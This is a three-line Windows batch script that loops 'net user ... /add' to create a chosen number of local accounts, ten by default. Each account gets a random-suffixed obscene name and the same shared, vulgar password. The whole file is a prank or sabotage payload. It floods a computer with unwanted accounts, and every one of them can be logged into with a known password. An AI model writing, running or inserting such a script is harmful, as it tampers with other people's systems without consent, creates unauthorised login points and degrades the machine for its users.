@echo off
IF [%1] == [] (set _par=10) else (set /a _par=%1)
for /l %%i in (1, 1, %_par%) DO net user "S3ND_NUD3S!_%RANDOM%" "D1CK_P1CKS" /add
